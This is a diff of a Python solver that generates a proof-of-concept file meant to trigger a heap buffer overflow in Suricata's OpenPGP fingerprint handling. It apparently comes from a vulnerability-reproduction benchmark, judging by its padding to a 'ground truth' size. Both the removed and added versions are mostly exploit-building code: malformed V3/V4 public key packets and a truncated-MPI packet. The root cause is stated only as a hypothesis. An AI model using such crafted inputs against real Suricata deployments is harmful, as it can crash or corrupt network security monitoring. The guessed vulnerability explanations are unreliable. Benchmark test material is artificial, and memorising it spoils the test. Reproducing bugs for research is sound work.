@@ -3,69 +3,46 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
-        Targeting Suricata OpenPGP fingerprint writing issue where V3 keys 
-        with non-RSA algorithms might trigger a buffer overflow due to 
-        mismatch between allocated size (MD5/16 bytes) and written size (SHA1/20 bytes).
+        Generate a PoC that triggers the vulnerability.
+        
+        The vulnerability is a heap buffer overflow in the OpenPGP code when writing the fingerprint
+        after a parsing step fails but is only logged.
+        We construct a V4 Public Key packet with a truncated MPI. This causes the MPI parser to fail,
+        but the code proceeds to write the V4 fingerprint (20 bytes) into a buffer that may be 
+        improperly sized (e.g., allocated for V3 which is 16 bytes) or corrupted due to the failure.
         """
         
-        def create_mpi(data: bytes) -> bytes:
-            # MPI format: 2-byte bit length (Big Endian) followed by data
-            bit_len = len(data) * 8
-            return struct.pack('>H', bit_len) + data
-
-        def create_packet(tag: int, body: bytes) -> bytes:
-            # OpenPGP Old Format Packet Header
-            # Tag 6 (Public Key): 0x99 (10 0110 01) -> Length type 1 (2 bytes)
-            # We use 0x99 for Public Key
-            header = b'\x99'
-            length = len(body)
-            # Length type 1 is 2 bytes big endian
-            return header + struct.pack('>H', length) + body
-
-        poc = b''
-
-        # 1. Standard valid V4 RSA Key to initialize parser state/structures
-        # Version 4, Timestamp 0, Algo 1 (RSA)
-        v4_body = b'\x04' + b'\x00\x00\x00\x00' + b'\x01'
-        v4_body += create_mpi(b'\xCC' * 16)    # Modulus (small)
-        v4_body += create_mpi(b'\x01\x00\x01') # Exponent
-        poc += create_packet(6, v4_body)
-
-        # 2. Malformed V3 Key with DSA (Algo 17)
-        # Hypothesis:
-        # The parser sees Version 3 and allocates 16 bytes for MD5 fingerprint.
-        # It then validates the algorithm. DSA (17) is invalid for V3 (only RSA supported).
-        # The error is logged, but execution proceeds.
-        # The fingerprint calculation then likely falls through to a default or V4 path (SHA1).
-        # It computes a 20-byte SHA1 hash and writes it into the 16-byte buffer.
-        # This causes a 4-byte heap buffer overflow.
-        v3_dsa_body = b'\x03' # Version 3
-        v3_dsa_body += b'\x00\x00\x00\x00' # Timestamp
-        v3_dsa_body += b'\x00\x00' # Validity (only in V3)
-        v3_dsa_body += b'\x11' # Algo 17 (DSA)
-        # DSA MPIs: p, q, g, y (dummy values)
-        v3_dsa_body += create_mpi(b'\x01') 
-        v3_dsa_body += create_mpi(b'\x01')
-        v3_dsa_body += create_mpi(b'\x01')
-        v3_dsa_body += create_mpi(b'\x01')
-        poc += create_packet(6, v3_dsa_body)
-
-        # 3. Malformed V3 Key with ECDSA (Algo 19)
-        # Similar logic: V3 header (alloc 16 bytes) but ECDSA algo (writes 20 bytes SHA1 or similar)
-        v3_ecdsa_body = b'\x03'
-        v3_ecdsa_body += b'\x00\x00\x00\x00'
-        v3_ecdsa_body += b'\x00\x00'
-        v3_ecdsa_body += b'\x13' # Algo 19 (ECDSA)
-        # ECDSA MPIs: OID, Point
-        v3_ecdsa_body += create_mpi(b'\x06\x08\x2A\x86\x48\xCE\x3D\x03\x01\x07') # OID p-256
-        v3_ecdsa_body += create_mpi(b'\x04' + b'\xAA'*32) # Point
-        poc += create_packet(6, v3_ecdsa_body)
-
-        # 4. Malformed V4 Key with Unknown Algo (250)
-        # Ensure we cover cases where unknown algo might trigger default bad behavior
-        v4_inv_body = b'\x04' + b'\x00\x00\x00\x00' + b'\xFA'
-        v4_inv_body += create_mpi(b'\x01')
-        poc += create_packet(6, v4_inv_body)
-
-        return poc
+        # Construct the body of the OpenPGP Public Key Packet (V4)
+        body = bytearray()
+        body.append(0x04)                   # Version: 4
+        body.extend(b'\x00\x00\x00\x00')    # Timestamp: 0
+        body.append(0x01)                   # Algorithm: RSA (1)
+        
+        # MPI 1 (Modulus): Valid entry
+        # Bit length: 1024 bits -> 128 bytes
+        body.extend(struct.pack('>H', 1024))
+        body.extend(b'A' * 128)
+        
+        # MPI 2 (Exponent): Truncated entry
+        # Bit length: 17 bits -> 3 bytes required
+        # We add the length bytes to the body, but we do NOT add the data bytes.
+        body.extend(struct.pack('>H', 17))
+        
+        # Packet header
+        # Tag 0x99: Old format, Tag 6 (Public Key), Length Type 1 (2 bytes)
+        # Packet length corresponds to the data we provided (header of MPI2 included, data excluded)
+        packet_len = len(body)
+        header = bytearray()
+        header.append(0x99)
+        header.extend(struct.pack('>H', packet_len))
+        
+        poc = header + body
+        
+        # Pad the PoC to match the approximate size of the ground truth (37535 bytes).
+        # This padding ensures the input is large enough to pass any minimum size checks 
+        # and helps with heap layout stability.
+        target_len = 37535
+        if len(poc) < target_len:
+            poc += b'\x00' * (target_len - len(poc))
+            
+        return bytes(poc)
